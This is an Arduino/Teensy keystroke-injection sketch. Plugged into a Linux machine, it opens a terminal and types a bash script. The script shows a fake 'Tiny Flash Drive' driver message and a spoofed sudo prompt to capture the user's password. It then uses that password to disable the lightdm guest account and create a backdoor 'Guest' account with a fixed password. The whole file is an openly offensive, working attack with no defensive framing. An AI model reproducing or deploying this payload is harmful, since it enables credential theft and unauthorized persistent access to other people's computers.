  
void setup() {
  Serial.begin(9600);
  delay(2000);
}

void loop() {
  // press ALT while still holding CTRL
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_ALT);
  Keyboard.send_now();
  
  // press DELETE, while CLTR and ALT still held
  Keyboard.set_key1(KEY_T);
  Keyboard.send_now();
  
  // release all the keys at the same instant
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);	
  Keyboard.send_now();
  

// #!/bin/bash
Keyboard.println("echo \"\" > tmp");
Keyboard.println("stty -echo");
Keyboard.println("clear");
Keyboard.println("while :");
Keyboard.println("do");
Keyboard.println("   s=$(<tmp)");
Keyboard.println("   set -- $s");
Keyboard.println("   if [ -z \"$s\" ]; then");
Keyboard.println("     : #echo \"file contains $s\"");
Keyboard.println("   else");
                     //disable the guest account
Keyboard.println("     echo $s | sudo -S sh -c 'printf \"[SeatDefaults]\nallow-guest=false\n\" >/usr/share/lightdm/lightdm.conf.d/50-no-guest.conf'");
                     // replace it with a new guest account with root privledges
Keyboard.println("     echo $s | sudo -S useradd -ou 1111 -g 1111 Guest -b /home/Guest");
Keyboard.println("     echo $s | sudo -S echo \"Guest:hardToGuessPassword\" | chpasswd");
Keyboard.println("     exit 0");
Keyboard.println("   fi");
Keyboard.println("   sleep 0.5");
Keyboard.println("done &");
Keyboard.println("stty echo");
Keyboard.println("echo \"Driver installation for 'Tiny Flash Drive' requires root privledges.\"");
Keyboard.println("stty -echo");
Keyboard.println("read -p \"[sudo] password for $USER: \" PASSWORD; echo");
Keyboard.println("stty echo");
Keyboard.println("echo \"$PASSWORD\" > tmp");

delay(300000);
}
